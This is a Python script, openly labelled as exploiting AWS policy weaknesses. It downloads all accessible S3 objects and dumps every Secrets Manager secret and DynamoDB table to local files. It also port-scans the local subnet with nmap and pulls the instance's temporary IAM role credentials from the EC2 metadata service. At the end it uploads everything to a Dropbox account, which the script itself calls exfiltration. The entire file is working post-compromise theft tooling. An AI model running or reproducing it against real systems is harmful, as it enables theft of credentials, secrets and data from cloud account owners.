import os
import dropbox
import configparser
import boto3
from botocore.exceptions import ClientError
import json
import psutil
import ipaddress
import nmap  # Requires: pip install python-nmap
import requests  # NEW: for IMDSv2 calls
from requests.exceptions import RequestException

# Directories
LOCAL_DOWNLOAD_DIR = 'upload'
os.makedirs(LOCAL_DOWNLOAD_DIR, exist_ok=True)

# Load configuration
config = configparser.ConfigParser()
config.read('config.ini')

try:
    AWS_REGION = config['aws']['region']
except KeyError:
    raise SystemExit("❌ AWS region not found in config.ini under [aws] section.")

try:
    DROPBOX_ACCESS_TOKEN = config['dropbox']['access_token']
except KeyError:
    raise SystemExit("❌ Dropbox access token not found in config.ini under [dropbox] section.")

# ------------------- AWS & Dropbox Functions -------------------

def download_from_s3(local_dir):
    s3 = boto3.client('s3', region_name=AWS_REGION)
    try:
        response = s3.list_buckets()
        buckets = [bucket['Name'] for bucket in response['Buckets']]
    except ClientError as e:
        print(f"❌ Failed to list S3 buckets: {e}")
        return

    print(f"🪣 Found {len(buckets)} buckets.")

    for bucket in buckets:
        print(f"\n📂 Accessing bucket: {bucket}")
        try:
            objects = s3.list_objects_v2(Bucket=bucket)
            if 'Contents' not in objects:
                print(f"   (Empty or no access to list contents.)")
                continue

            for obj in objects['Contents']:
                key = obj['Key']
                local_path = os.path.join(local_dir, os.path.basename(key))
                try:
                    print(f"   ⬇ Downloading {key} -> {local_path}")
                    s3.download_file(bucket, key, local_path)
                except ClientError as download_err:
                    print(f"   ❌ Failed to download {key}: {download_err}")

        except ClientError as list_err:
            print(f"   ❌ Cannot list objects in {bucket}: {list_err}")

def list_and_save_secrets(local_dir):
    secrets_client = boto3.client('secretsmanager', region_name=AWS_REGION)
    secrets_file_path = os.path.join(local_dir, 'secrets.txt')

    try:
        paginator = secrets_client.get_paginator('list_secrets')
        with open(secrets_file_path, 'w') as f:
            for page in paginator.paginate():
                for secret in page.get('SecretList', []):
                    secret_name = secret['Name']
                    try:
                        get_secret_value_response = secrets_client.get_secret_value(SecretId=secret_name)
                        secret_value = get_secret_value_response.get('SecretString', '')

                        try:
                            secret_value_parsed = json.loads(secret_value)
                            secret_value = json.dumps(secret_value_parsed, indent=2)
                        except (ValueError, TypeError):
                            pass

                        f.write(f"Secret Name: {secret_name}\n")
                        f.write(f"Secret Value: {secret_value}\n")
                        f.write("=" * 50 + "\n")
                        print(f"🔑 Saved secret: {secret_name}")

                    except ClientError as secret_err:
                        print(f"❌ Failed to retrieve secret {secret_name}: {secret_err}")
    except ClientError as e:
        print(f"❌ Failed to list secrets: {e}")

def list_and_save_dynamo_tables(local_dir):
    dynamodb = boto3.client('dynamodb', region_name=AWS_REGION)
    dynamo_file_path = os.path.join(local_dir, 'dynamodb_data.txt')

    try:
        table_list = dynamodb.list_tables().get('TableNames', [])
        with open(dynamo_file_path, 'w') as f:
            for table_name in table_list:
                f.write(f"Table: {table_name}\n")
                print(f"📄 Fetching data from DynamoDB table: {table_name}")

                try:
                    paginator = dynamodb.get_paginator('scan')
                    for page in paginator.paginate(TableName=table_name):
                        for item in page.get('Items', []):
                            json_item = json.dumps(item, indent=2)
                            f.write(json_item + "\n")
                    f.write("=" * 50 + "\n")
                except ClientError as scan_err:
                    print(f"❌ Failed to scan table {table_name}: {scan_err}")
    except ClientError as e:
        print(f"❌ Failed to list DynamoDB tables: {e}")

def upload_to_dropbox(local_dir):
    dbx = dropbox.Dropbox(DROPBOX_ACCESS_TOKEN)
    for root, dirs, files in os.walk(local_dir):
        for filename in files:
            local_path = os.path.join(root, filename)
            dropbox_path = '/' + filename
            with open(local_path, 'rb') as f:
                print(f"Uploading {local_path} to Dropbox at {dropbox_path}...")
                dbx.files_upload(f.read(), dropbox_path, mode=dropbox.files.WriteMode.add)
    print("✅ All files uploaded.")

# ------------------- New Nmap Function -------------------

def get_local_subnet():
    """Detect local subnet from active network interface."""
    for iface, addrs in psutil.net_if_addrs().items():
        for addr in addrs:
            if getattr(addr.family, "name", "") == "AF_INET" and not addr.address.startswith("127."):
                ip = addr.address
                netmask = addr.netmask
                network = ipaddress.IPv4Network(f"{ip}/{netmask}", strict=False)
                return str(network)
    raise RuntimeError("No active network interface found.")

def scan_network_with_nmap(local_dir):
    """Scan local subnet with Nmap and save results."""
    EXTENDED_PORTS = (
        "20-21,22,23,25,53,67-69,80,110,123,137-139,143,"
        "161-162,389,443,445,465,514,587,636,873,993,995,1080,"
        "1433,1521,2049,2082-2083,2483-2484,3000,3306,3389,5432,"
        "5900,6379,8080,8443,9000,9200,10000"
    )

    subnet = get_local_subnet()
    print(f"🌐 Detected subnet: {subnet}")

    scanner = nmap.PortScanner()
    scanner.scan(hosts=subnet, ports=EXTENDED_PORTS, arguments="-T4 -Pn")

    nmap_file_path = os.path.join(local_dir, 'nmap_results.txt')
    with open(nmap_file_path, 'w') as f:
        for host in scanner.all_hosts():
            f.write(f"Host: {host} ({scanner[host].hostname()})\n")
            f.write(f"State: {scanner[host].state()}\n")
            for proto in scanner[host].all_protocols():
                ports = scanner[host][proto].keys()
                for port in sorted(ports):
                    state = scanner[host][proto][port]['state']
                    if state == "open":
                        f.write(f"  Port {port}/{proto} - OPEN\n")
            f.write("\n")
    print(f"✅ Nmap results saved to {nmap_file_path}")

# ------------------- NEW: IMDSv2 Probing -------------------

IMDS_BASE = "http://169.254.169.254/latest"

def _imds_get_token():
    try:
        r = requests.put(
            f"{IMDS_BASE}/api/token",
            headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
            timeout=2,
        )
        r.raise_for_status()
        return r.text
    except RequestException as e:
        raise RuntimeError(f"IMDSv2 token fetch failed: {e}")

def _imds_get(path, token):
    try:
        r = requests.get(
            f"{IMDS_BASE}{path}",
            headers={"X-aws-ec2-metadata-token": token},
            timeout=2,
        )
        r.raise_for_status()
        return r.text
    except RequestException as e:
        raise RuntimeError(f"IMDSv2 GET {path} failed: {e}")

def probe_imdsv2(local_dir):
    """
    Query IMDSv2 for instance/role context, then use EC2 API to fetch:
    - IAM role name + temp credentials
    - Security group details (names + ingress/egress rules)
    - ENI/network details incl. public IP association
    Saves results to JSON and a human-readable TXT in `local_dir`.
    """
    output_json = os.path.join(local_dir, "imds_ec2_context.json")
    output_txt  = os.path.join(local_dir, "imds_ec2_context.txt")

    context = {"imds": {}, "security_groups": [], "network_interfaces": []}

    try:
        token = _imds_get_token()

        # Basic instance identity
        instance_id = _imds_get("/meta-data/instance-id", token).strip()
        az = _imds_get("/meta-data/placement/availability-zone", token).strip()
        sg_names = _imds_get("/meta-data/security-groups", token).strip().splitlines() if True else []
        sg_ids = _imds_get("/meta-data/security-group-ids", token).strip().splitlines() if True else []

        # IAM Role & credentials
        role_name = ""
        creds = {}
        try:
            role_name = _imds_get("/meta-data/iam/security-credentials/", token).strip().splitlines()[0]
            creds_raw = _imds_get(f"/meta-data/iam/security-credentials/{role_name}", token)
            creds = json.loads(creds_raw)
        except Exception as e:
            print(f"⚠️  Could not fetch role credentials: {e}")

        # ENIs & public IPs from IMDS
        eni_ids = []
        try:
            macs = _imds_get("/meta-data/network/interfaces/macs/", token).splitlines()
            for mac in macs:
                mac = mac.strip().strip("/")
                if not mac:
                    continue
                try:
                    eni_id = _imds_get(f"/meta-data/network/interfaces/macs/{mac}/interface-id", token).strip()
                except Exception:
                    eni_id = ""
                local_ips = _imds_get(f"/meta-data/network/interfaces/macs/{mac}/local-ipv4s", token).splitlines() if True else []
                public_ips = []
                try:
                    public_ips = _imds_get(f"/meta-data/network/interfaces/macs/{mac}/public-ipv4s", token).splitlines()
                except Exception:
                    pass
                eni_ids.append(eni_id)
                context["network_interfaces"].append({
                    "mac": mac,
                    "interface_id": eni_id,
                    "local_ipv4s": local_ips,
                    "public_ipv4s": public_ips,
                })
        except Exception as e:
            print(f"⚠️  Could not enumerate ENIs via IMDS: {e}")

        context["imds"] = {
            "instance_id": instance_id,
            "availability_zone": az,
            "iam_role_name": role_name,
            "iam_role_credentials": creds,  # NOTE: contains temporary credentials
            "security_group_names": sg_names,
            "security_group_ids": sg_ids,
        }

        # Enrich with EC2 API: SG rules + ENI associations
        ec2 = boto3.client("ec2", region_name=AWS_REGION)

        # Security groups (ingress/egress)
        if sg_ids:
            try:
                sg_resp = ec2.describe_security_groups(GroupIds=sg_ids)
                for sg in sg_resp.get("SecurityGroups", []):
                    context["security_groups"].append({
                        "group_id": sg.get("GroupId"),
                        "group_name": sg.get("GroupName"),
                        "description": sg.get("Description"),
                        "vpc_id": sg.get("VpcId"),
                        "ingress": sg.get("IpPermissions", []),
                        "egress": sg.get("IpPermissionsEgress", []),
                    })
            except ClientError as e:
                print(f"❌ describe_security_groups failed: {e}")

        # ENI association & public IP details
        if eni_ids:
            try:
                eni_resp = ec2.describe_network_interfaces(NetworkInterfaceIds=[eni for eni in eni_ids if eni])
                eni_map = {eni["NetworkInterfaceId"]: eni for eni in eni_resp.get("NetworkInterfaces", [])}
                for nic in context["network_interfaces"]:
                    eni = eni_map.get(nic.get("interface_id"))
                    if eni:
                        assoc = eni.get("Association", {})
                        nic["ec2_association"] = {
                            "public_ip": assoc.get("PublicIp"),
                            "public_dns_name": assoc.get("PublicDnsName"),
                            "allocation_id": assoc.get("AllocationId"),
                            "carrier_ip": assoc.get("CarrierIp"),
                        }
                        nic["subnet_id"] = eni.get("SubnetId")
                        nic["vpc_id"] = eni.get("VpcId")
                        nic["description"] = eni.get("Description")
                        nic["private_dns_name"] = eni.get("PrivateDnsName")
            except ClientError as e:
                print(f"❌ describe_network_interfaces failed: {e}")

        # Persist results
        with open(output_json, "w") as jf:
            json.dump(context, jf, indent=2, default=str)

        # Also write a human-readable summary
        with open(output_txt, "w") as tf:
            tf.write(f"Instance ID: {context['imds'].get('instance_id')}\n")
            tf.write(f"AZ: {context['imds'].get('availability_zone')}\n")
            tf.write(f"IAM Role: {context['imds'].get('iam_role_name')}\n\n")

            tf.write("Security Groups:\n")
            for sg in context.get("security_groups", []):
                tf.write(f"  - {sg['group_name']} ({sg['group_id']}) in {sg.get('vpc_id')}\n")
                tf.write("    Ingress rules:\n")
                for perm in sg.get("ingress", []):
                    tf.write(f"      {perm}\n")
                tf.write("    Egress rules:\n")
                for perm in sg.get("egress", []):
                    tf.write(f"      {perm}\n")
                tf.write("\n")

            tf.write("Network Interfaces:\n")
            for nic in context.get("network_interfaces", []):
                tf.write(f"  - {nic.get('interface_id')} (MAC {nic.get('mac')})\n")
                tf.write(f"    Local IPs: {', '.join(nic.get('local_ipv4s', []))}\n")
                tf.write(f"    Public IPs (IMDS): {', '.join(nic.get('public_ipv4s', [])) or 'None'}\n")
                assoc = nic.get("ec2_association", {})
                if assoc:
                    tf.write(f"    Public IP (EC2): {assoc.get('public_ip')}\n")
                    tf.write(f"    Public DNS: {assoc.get('public_dns_name')}\n")
                    tf.write(f"    AllocationId: {assoc.get('allocation_id')}\n")
                tf.write("\n")

        print(f"✅ IMDS/EC2 context saved to {output_json} and {output_txt}")

    except RuntimeError as e:
        print(f"❌ IMDS probing failed: {e}")

# ------------------- Main -------------------

if __name__ == "__main__":
    print(f"\n#################### Exploiting AWS S3 Bucket Policy Weaknesses ##################### \n")
    download_from_s3(LOCAL_DOWNLOAD_DIR)
    print(f"\n#################### Exploiting AWS Secrets Manager Policy Weaknesses ##################### \n")
    list_and_save_secrets(LOCAL_DOWNLOAD_DIR)
    print(f"\n#################### Exploiting AWS Dynamo DB Tables Policy Weaknesses ##################### \n")
    list_and_save_dynamo_tables(LOCAL_DOWNLOAD_DIR)
    print(f"\n#################### Enumerating Local Network and live hosts ##################### \n")
    scan_network_with_nmap(LOCAL_DOWNLOAD_DIR)
    print(f"\n#################### Probing IMDSv2 and EC2 context ##################### \n")
    probe_imdsv2(LOCAL_DOWNLOAD_DIR)
    print(f"\n#################### Exfiltrating collected data to DropBox ##################### \n")
    upload_to_dropbox(LOCAL_DOWNLOAD_DIR)
